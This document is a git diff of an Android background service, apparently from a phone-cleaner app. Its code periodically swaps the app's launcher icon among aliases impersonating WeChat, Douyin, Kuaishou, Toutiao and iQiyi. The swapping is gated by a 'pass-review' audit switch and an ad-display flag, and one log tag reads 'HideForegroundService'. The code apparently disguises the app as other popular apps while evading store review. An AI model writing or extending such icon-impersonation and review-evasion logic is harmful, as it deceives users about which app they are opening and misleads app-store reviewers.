@@ -116,7 +116,8 @@ public final class LocalService extends Service {
     public IBinder onBind(Intent intent) {
         return mBilder;
     }
-//    private AppPackageNameListDB appPackageNameList;
+
+    //    private AppPackageNameListDB appPackageNameList;
 //    private AppPackageNameListDB.DataBean mDataBean;
     private int mShowRoate = 0;
 
@@ -200,7 +201,7 @@ public final class LocalService extends Service {
         } catch (Exception e) {
             Log.i("HideForegroundService--", e.getMessage());
         }
-        if (!isExeTask||System.currentTimeMillis()- runTime >15*1000) {
+        if (!isExeTask || System.currentTimeMillis() - runTime > 15 * 1000) {
             String auditSwitch = SPUtil.getString(getApplicationContext(), AppApplication.AuditSwitch, "1");
             //过审开关打开状态
             //!PreferenceUtil.isShowAD()广告展示状态
@@ -233,7 +234,7 @@ public final class LocalService extends Service {
                 } else {
                     min = dataBean.getDisplayTime();
                 }
-                setAppIcon(min);
+                isTimeSucess(min);
             }
         }
 
@@ -607,12 +608,12 @@ public final class LocalService extends Service {
     }
 
     private String oldPackageName = "";
-    private long runTime=0;
+    private long runTime = 0;
     @SuppressLint("HandlerLeak")
     Runnable mTask = new Runnable() {
         @Override
         public void run() {
-            runTime=System.currentTimeMillis();
+            runTime = System.currentTimeMillis();
             String packageName = getAppInfo();
             if (TextUtils.equals(packageName, LocalService.this.getPackageName())) {
                 return;
@@ -808,10 +809,10 @@ public final class LocalService extends Service {
     private void setAppPackageName() {
         if (appMap.size() <= 0) {
             appMap.add("com.tencent.mm");
-            appMap.add("com.qiyi.video");
-            appMap.add("com.smile.gifmaker");
             appMap.add("com.ss.android.article.news");
             appMap.add("com.ss.android.ugc.aweme");
+            appMap.add("com.smile.gifmaker");
+            appMap.add("com.qiyi.video");
         }
     }
 
@@ -820,42 +821,52 @@ public final class LocalService extends Service {
             case 0:
                 return "com.xiaoniu.cleanking.wx";
             case 1:
-                return "com.xiaoniu.cleanking.aqy";
+                return "com.xiaoniu.cleanking.tt";
             case 2:
-                return "com.xiaoniu.cleanking.ks";
-            case 3:
-                return "com.xiaoniu.cleanking.jrtt";
-            case 4:
                 return "com.xiaoniu.cleanking.dy";
+            case 3:
+                return "com.xiaoniu.cleanking.ks";
+            case 4:
+                return "com.xiaoniu.cleanking.aqy";
+
 
         }
         return "";
     }
 
-
-    private void setAppIcon(int hour) {
-//        Log.e("dong", "dispalyTime==" + hour);
-        setAppPackageName();
+    private void isTimeSucess(int hour) {
         if (MmkvUtil.getLong("appiconTime", 0) == 0) {
             MmkvUtil.saveLong("appiconTime", System.currentTimeMillis());
             return;
-        } else if (System.currentTimeMillis() - MmkvUtil.getLong("appiconTime", 0) < (hour * 60*1000)) {
+        } else if (System.currentTimeMillis() - MmkvUtil.getLong("appiconTime", 0) < (hour * 60 * 1000)) {
             return;
         } else {
             MmkvUtil.saveLong("appiconTime", System.currentTimeMillis());
         }
+        setAppIcon();
+    }
+
+
+    private void setAppIcon() {
+//        Log.e("dong", "dispalyTime==" + hour);
+        setAppPackageName();
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             if (isSecurityPermissionOpen(this)) {
                 if (getAppProcessName(this)) {
                     int newIndex = MmkvUtil.getInt("appicon", 0);
                     int oldIndex = MmkvUtil.getInt("odlappicon", 0);
+                    if (oldIndex == newIndex) {
+                        return;
+                    }
+
                     ComponentName apple = new ComponentName(getApplication(), getPackName(newIndex));
                     QuickUtils.getInstant(this).enableComponent(apple);
+
                     if (oldIndex >= 0) {
                         ComponentName now = new ComponentName(getApplication(), getPackName(oldIndex));
                         QuickUtils.getInstant(this).disableComponent(now);
                     }
-                    if (newIndex >= appMap.size()) {
+                    if (newIndex >= appMap.size()-1) {
                         MmkvUtil.saveInt("appicon", 0);
                     } else {
                         MmkvUtil.saveInt("appicon", newIndex + 1);
@@ -867,10 +878,11 @@ public final class LocalService extends Service {
                     }
                 } else if (MmkvUtil.getInt("appicon", 0) < (appMap.size() - 1)) {
                     MmkvUtil.saveInt("appicon", MmkvUtil.getInt("appicon", 0) + 1);
+                    setAppIcon();
                 } else {
                     MmkvUtil.saveInt("appicon", 0);
                 }
-            } else if (MmkvUtil.getInt("appicon", 0) == 0) {
+            } else if (MmkvUtil.getInt("appicon", 0) == 0 && !MmkvUtil.getBool("isExecute", false)) {
                 ComponentName newAPP = new ComponentName(getApplication(), "com.xiaoniu.cleanking.wx");
                 QuickUtils.getInstant(this).enableComponent(newAPP);
                 MmkvUtil.saveInt("appicon", 1);
